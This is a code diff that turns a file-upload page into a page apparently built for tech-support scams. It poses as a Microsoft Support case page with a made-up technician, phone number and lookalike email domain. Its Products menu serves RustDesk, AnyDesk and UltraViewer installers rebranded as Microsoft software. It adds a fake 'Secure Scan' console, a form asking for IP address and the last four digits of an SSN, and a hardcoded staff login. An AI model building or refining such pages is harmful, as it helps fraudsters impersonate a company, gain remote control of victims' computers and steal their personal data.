@@ -1,125 +1,270 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Send Files to JIN</title>
+  <meta charset="UTF-8">
+  <title>Case 675223 - Microsoft Support</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to right, #e0f7fa, #e1bee7);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
       margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to bottom right, #f3f6fa, #ffffff);
     }
-    .container {
-      background: white;
-      padding: 40px;
-      border-radius: 15px;
-      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-      text-align: center;
-      width: 90%;
-      max-width: 500px;
+    .header {
+      padding: 15px 40px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: #ffffff;
+      border-bottom: 1px solid #ddd;
+      position: relative;
     }
-    h2 {
-      color: #4a148c;
-      margin-bottom: 20px;
+    .logo {
+      height: 26px;
     }
-    input, textarea, button {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 16px;
+    .nav-links {
+      display: flex;
+      align-items: center;
     }
-    button {
-      background-color: #7b1fa2;
-      color: white;
+    .nav-links a, .dropdown-btn {
+      margin: 0 15px;
+      text-decoration: none;
+      color: #333;
+      font-weight: 500;
+      font-size: 15px;
+      background: none;
       border: none;
       cursor: pointer;
-      transition: background-color 0.3s;
     }
-    button:hover {
-      background-color: #4a148c;
+    .right-section {
+      display: flex;
+      align-items: center;
     }
-    .scanner-box {
-      margin-top: 20px;
-      padding: 20px;
-      border: 2px dashed #007bff;
-      color: #007bff;
+    .search-box {
+      padding: 6px 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-right: 15px;
+    }
+    .profile-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+    }
+    .main {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 60px 20px;
+    }
+    .modal {
       display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 20px 30px;
       border-radius: 10px;
-      background-color: #e3f2fd;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      z-index: 100;
+      animation: fadeIn 0.3s ease-in-out;
     }
-    .complete {
-      color: green;
-      font-weight: bold;
-      background-color: #e8f5e9;
-      border: 2px solid green;
+    .dropdown-content {
+      display: none;
+      position: absolute;
+      top: 50px;
+      left: 100px;
+      background-color: #ffffff;
+      min-width: 200px;
+      box-shadow: 0px 8px 16px rgba(0,0,0,0.2);
+      z-index: 1;
+      border-radius: 6px;
     }
-    .login-link {
-      margin-top: 20px;
-      display: inline-block;
+    .dropdown-content a {
+      color: #333;
+      padding: 12px 16px;
       text-decoration: none;
-      background-color: #00796b;
-      color: white;
-      padding: 10px 20px;
-      border-radius: 8px;
-      font-weight: bold;
-      transition: background-color 0.3s;
+      display: block;
+      font-size: 14px;
+      border-bottom: 1px solid #eee;
     }
-    .login-link:hover {
-      background-color: #004d40;
+    .dropdown-content a:hover {
+      background-color: #f0f0f0;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    /* Media Queries for Mobile Devices */
+    @media screen and (max-width: 768px) {
+      .header {
+        padding: 15px 20px;
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .nav-links {
+        display: block;
+        width: 100%;
+        text-align: left;
+      }
+      .nav-links a, .dropdown-btn {
+        margin: 5px 0;
+        font-size: 14px;
+      }
+      .search-box {
+        width: 100%;
+        margin-right: 0;
+        margin-top: 10px;
+      }
+      .right-section {
+        display: block;
+        width: 100%;
+        margin-top: 10px;
+      }
+      .main {
+        padding: 40px 10px;
+      }
+      .modal {
+        width: 80%;
+        max-width: 400px;
+      }
+      .stars span {
+        font-size: 22px;
+      }
+      .profile-icon {
+        width: 24px;
+        height: 24px;
+      }
+      .logo {
+        height: 20px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Send Codes or Documents</h2>
-    <form id="scanForm">
-      <textarea id="textInput" name="text" placeholder="Enter text (optional)"></textarea>
-      <input type="file" id="fileInput" name="files[]" accept="image/*,video/*" multiple />
-      <button type="submit">Send</button>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft Logo" class="logo">
+    <div class="nav-links">
+      <button class="dropdown-btn" onclick="toggleDropdownMenu()">Products ▾</button>
+      <div id="dropdown" class="dropdown-content">
+        <a href="downloads/rustdesk-1.3.9-x86_64.exe" download>Microsoft Rustdesk</a>
+        <a href="downloads/anydesk.exe" download>Microsoft Anydesk</a>
+        <a href="downloads/ultraviewer.exe" download>Microsoft Ultraviewer</a>
+      </div>
+      <a href="#">Support</a>
+      <a href="#">Help</a>
+      <a href="#" onclick="openLoginModal()">Login</a>
+    </div>
+    <div class="right-section">
+      <input type="text" placeholder="Search..." class="search-box">
+      <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="Profile" class="profile-icon">
+    </div>
+  </div>
+
+  <div class="modal" id="loginModal">
+    <h3>Login</h3>
+    <form onsubmit="event.preventDefault(); checkLogin()">
+      <input id="username" placeholder="Username" required><br>
+      <input id="password" type="password" placeholder="Password" required><br>
+      <button type="submit">Login</button>
     </form>
-    <div id="scanner" class="scanner-box">Sending...</div>
-    <div id="completeMsg" class="scanner-box complete">Sent Successfully</div>
-    <a class="login-link" href="jin-portal.html">🔐 Login to JIN Portal</a>
   </div>
 
   <script>
-    const form = document.getElementById("scanForm");
-    const scanner = document.getElementById("scanner");
-    const completeMsg = document.getElementById("completeMsg");
+    function openLoginModal() {
+      document.getElementById("loginModal").style.display = "block";
+    }
 
-    form.addEventListener("submit", function (e) {
-      e.preventDefault();
-      scanner.style.display = "block";
-      completeMsg.style.display = "none";
-
-      const text = document.getElementById("textInput").value;
-      const files = document.getElementById("fileInput").files;
-      const formData = new FormData();
-
-      formData.append("text", text);
-      for (let i = 0; i < files.length; i++) {
-        formData.append("files[]", files[i]);
-      }
-
-      fetch("upload.php", {
-        method: "POST",
-        body: formData,
-      })
-      .then(() => {
+    function checkLogin() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+      if (user.toLowerCase() === "davidcook" && pass === "Amazon123@") {
+        alert("Login successful!");
+        document.getElementById("loginModal").style.display = "none";
         setTimeout(() => {
-          scanner.style.display = "none";
-          completeMsg.style.display = "block";
-        }, 5000);
-      });
-    });
+          document.getElementById("editModal").style.display = "block";
+        }, 300);
+        document.getElementById("loginModal").style.display = "none";
+        document.getElementById("editModal").style.display = "block";
+      } else {
+        alert("Invalid credentials");
+      }
+    }
+
+    function toggleDropdownMenu() {
+      const dropdown = document.getElementById("dropdown");
+      dropdown.style.display = dropdown.style.display === "block" ? "none" : "block";
+    }
+
+    window.onclick = function(event) {
+      if (!event.target.matches('.dropdown-btn')) {
+        const dropdown = document.getElementById("dropdown");
+        if (dropdown && dropdown.style.display === "block") {
+          dropdown.style.display = "none";
+        }
+      }
+    }
   </script>
+
+  <div class="main">
+    <div style="text-align: center;">
+      <h2>Technician Assigned: David Cook</h2>
+      <p>Case ID: 675223 | Employee ID: MC20230675</p>
+      <img src="https://randomuser.me/api/portraits/men/34.jpg" alt="Technician" style="width:100px; border-radius:50%; margin: 20px 0;">
+      <p><strong>Specialization:</strong> Network Troubleshooting & Remote Support</p>
+      <p><strong>Email:</strong> david.cook@microsoftsupport.com</p>
+      <p><strong>Support Number:</strong> +1 206 279 9715</p>
+      
+      <div style="margin-top: 30px;">
+        <p style="font-size: 14px; color: #333;">You can rate your technician service once the case is resolved</p>
+        <h3>Rate Support</h3>
+        <div class="stars">
+          <span onclick="rate(1)" style="font-size: 26px; cursor: pointer; color: #ccc;">★</span>
+          <span onclick="rate(2)" style="font-size: 26px; cursor: pointer; color: #ccc;">★</span>
+          <span onclick="rate(3)" style="font-size: 26px; cursor: pointer; color: #ccc;">★</span>
+          <span onclick="rate(4)" style="font-size: 26px; cursor: pointer; color: #ccc;">★</span>
+          <span onclick="rate(5)" style="font-size: 26px; cursor: pointer; color: #ccc;">★</span>
+        </div>
+        <p id="rating-msg" style="margin-top:10px; font-size:14px; color:green;"></p>
+
+        <div style="margin-top: 30px;">
+          <h4>📞 Schedule a Follow-up Call</h4>
+          <form onsubmit="event.preventDefault(); alert('Your call has been scheduled.');">
+            <input type="text" placeholder="Your Name" required style="padding: 6px; width: 90%; margin-bottom: 8px;"><br>
+            <input type="tel" placeholder="Phone Number" required style="padding: 6px; width: 90%; margin-bottom: 8px;"><br>
+            <button type="submit" style="padding: 6px 14px; background-color: #0078d4; color: white; border: none; border-radius: 4px;">Schedule</button>
+          </form>
+        </div>
+      </div>
+
+      <br><br>
+      <button onclick="openScanModal()" style="padding: 10px 20px; background-color: #0078d4; color: white; border: none; border-radius: 6px; cursor: pointer;">Click to Know Your Case Records</button>
+    </div>
+  </div>
+
+  <!-- Scan Modal -->
+  <div id="scanModal" class="modal" style="display:none; max-width: 700px; width: 90%; position: relative;">
+    <button onclick="closeScanModal()" style="position: absolute; top: 10px; right: 15px; background: transparent; border: none; font-size: 20px; cursor: pointer;">&times;</button>
+    <h3 style="color: #0078d4;">Microsoft Secure Scan</h3>
+    <div id="scanBox" style="background: black; color: white; font-family: monospace; padding: 10px; height: 180px; overflow-y: auto; border-radius: 8px;">
+      > Initiating secure scan...<br>
+    </div>
+    <button onclick="startScan()" style="margin-top: 12px; padding: 6px 12px; background-color: #0078d4; color: white; border: none; border-radius: 4px;">Start Scan</button>
+    <div id="finalReport" style="margin-top: 20px; display: none; background: #f9f9f9; padding: 10px; border-radius: 8px; text-align: left;"></div>
+  </div>
+
+  <!-- Edit Modal -->
+  <div id="editModal" class="modal" style="display:none; max-width: 500px; width: 90%;">
+    <h3>Edit Scan Information</h3>
+    <form id="editForm">
+      <input name="name" placeholder="User Name" required style="margin: 5px; padding: 5px; width: 90%;"><br>
+      <input name="ip" placeholder="IP Address" required style="margin: 5px; padding: 5px; width: 90%;"><br>
+      <input name="ssn" placeholder="Last 4 of SSN" required style="margin: 5px; padding: 5px; width: 90%;"><br>
+      <input name="security" placeholder="Security Level" required style="margin: 5px; padding: 5px; width: 90%;"><br>
+      <button type="submit" style="padding: 6px 12px; background: #0078d4; color: white; border: none; border-radius: 4px; margin-top: 10px;">Save</button>
+    </form>
+  </div>
 </body>
 </html>
